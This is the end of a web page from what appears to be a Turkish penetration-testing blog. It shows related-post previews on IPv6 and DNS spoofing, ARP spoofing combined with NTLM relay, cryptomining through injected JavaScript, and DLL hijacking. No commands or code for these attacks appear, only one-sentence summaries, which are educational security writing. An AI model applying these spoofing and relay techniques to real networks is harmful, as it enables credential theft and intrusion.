                  OFFENSIVE yerel ağda istemci tarafından aratıldığı zaman, istemciler IPv4 ve IPv6 üzerinden arama gerçekleştirilir. IPv6 üzerinden bizim spoof ettiğimiz OFFENSIVE.LOCAL adresi kurbanlar tarafından ...
                </p>
              </div>
            </div>
          </a>
        </div>
      
        
        
        <div class="col">
          <a href="/posts/arp-dns-spoof-ntlmrelay/" class="card post-preview h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class="small"
  data-ts="1689195600"
  data-df="ll"
  
>
  Jul 13, 2023
</em>

              <h4 class="pt-0 my-2" data-toc-skip>ARP & DNS Spoof + Ntlmrelay</h4>
              <div class="text-muted small">
                <p>
                  





                  Saldırgan, Arp spoof ile cihazların arp tablosunu değiştirir. Değiştirilen tabloda kendisini router olarak gösterir. Dns spoof ile spesifik A kayıtları spooflanır. karaca.com = 192.168.1.40  olacak...
                </p>
              </div>
            </div>
          </a>
        </div>
      
        
        
        <div class="col">
          <a href="/posts/enterprise-networklerde-coin-mining/" class="card post-preview h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class="small"
  data-ts="1689109200"
  data-df="ll"
  
>
  Jul 12, 2023
</em>

              <h4 class="pt-0 my-2" data-toc-skip>Enterprise Networklerde Coin Mining</h4>
              <div class="text-muted small">
                <p>
                  





                  Temelde ARP Spoof ile gerçekleşir. Saldırgan yerel ağda arp spoof başlatır. Saldırı sonucunda kendi mac adresi kurbanlar tarafından bilinir. Kendi vermiş olduğu javascript dosyasını kurban browserl...
                </p>
              </div>
            </div>
          </a>
        </div>
      
    </div>
    <!-- .card-deck -->
  </div>
  <!-- #related-posts -->


      
        
        <!-- Navigation buttons at the bottom of the post. -->

<div class="post-navigation d-flex justify-content-between">
  
    <a
      href="/posts/mitm6-ve-ntlmrelay/"
      class="btn btn-outline-primary"
      prompt="Older"
    >
      <p>mitm6 & ntlmrelay</p>
    </a>
  

  
    <a
      href="/posts/dll-hijacking/"
      class="btn btn-outline-primary"
      prompt="Newer"
    >
      <p>DLL Hijacking</p>
    </a>
  
</div>

      
        
        <!--  The comments switcher -->


      
    </div>
  </div>


        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 post-content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/movement/">movement</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/non-user/">non-user</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ntlmrelay/">ntlmrelay</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/relay-based/">relay-based</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/arp/">ARP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/dll/">dll</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/dns/">DNS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/pe/">PE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/spoof-based/">spoof-based</a>
      
    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>
    </div>

    <!-- The Footer
<footer>
  <div class="container px-lg-4">
    <div class="d-flex justify-content-center align-items-center text-muted mx-md-3">
      <p>
      </p>

      <p>©
        2023
        <a href="https://twitter.com/x67sv"></a>.
        
      </p>
    </div>
  </div>
</footer>
-->


    <div id="mask"></div>

    <button id="back-to-top" aria-label="back-to-top" class="btn btn-lg btn-box-shadow">
      <i class="fas fa-angle-up"></i>
    </button>

    
      <div
        id="notification"
        class="toast"
        role="alert"
        aria-live="assertive"
        aria-atomic="true"
        data-bs-animation="true"
        data-bs-autohide="false"
      >
        <div class="toast-header">
          <button
            type="button"
            class="btn-close ms-auto"
            data-bs-dismiss="toast"
            aria-label="Close"
          ></button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="px-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.7/dayjs.min.js,npm/dayjs@1.11.7/locale/en.min.js,npm/dayjs@1.11.7/plugin/relativeTime.min.js,npm/dayjs@1.11.7/plugin/localizedFormat.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

